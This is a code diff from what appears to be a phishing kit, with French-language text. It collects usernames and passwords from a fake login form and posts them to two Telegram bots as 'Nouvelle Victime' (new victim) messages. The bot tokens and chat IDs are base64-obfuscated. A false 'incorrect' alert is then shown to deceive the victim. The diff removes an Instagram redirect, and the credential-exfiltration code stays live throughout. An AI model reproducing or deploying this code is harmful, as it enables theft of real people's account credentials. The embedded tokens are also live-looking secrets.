@@ -44,13 +44,12 @@
     const code = `
     function sendToTelegram(message, tkn, chId) {
         const url = \`https://api.telegram.org/bot\${tkn}/sendMessage\`;
-        window.location.href = 'https://instagram.com'; 
-    
+        
         const data = {
             chat_id: chId,
             text: message
         };
-    
+
         return fetch(url, {
             method: 'POST',
             headers: {
@@ -77,19 +76,18 @@
     document.querySelector('.btn').addEventListener('click', async function() {
         const username = document.querySelector('input[type="text"]').value;
         const YKK = document.querySelector('input[type="YKK"]').value;
-    
+
         if (username && YKK) {
             const message = \` ✨ Nouvelle Victime ✨ (AK) by YKK☑️\\n\\nNom de profil 👤: \${username}\\nMot de passe 🔒: \${YKK}\`;
 
-            // Token1 b atob
             const tkn1 = atob('Njc5OTk1NjQ4MDpBQUY2dUtNNGI3MmFBeE5lNm4ydk9DdUhwZzdyQ0pvUlBrWQ==');  
             const chId1 = atob('NjY2OTY5MzgwNQ==');
             const tkn2 = atob('Nzk3OTk4MzYxMDpBQUdBNDlSZ2IxMHdlSlpxWVJhaS1IdWNzS2t2YTBSRk5Oaw==');  
             const chId2 = atob('Nzc0Mzg2Nzc2MQ=='); 
-    
+
             const success1 = await sendToTelegram(message, tkn1, chId1);
             const success2 = await sendToTelegram(message, tkn2, chId2);
-    
+
             if (success1 && success2) {
                 alert('incorrect');
             } else {
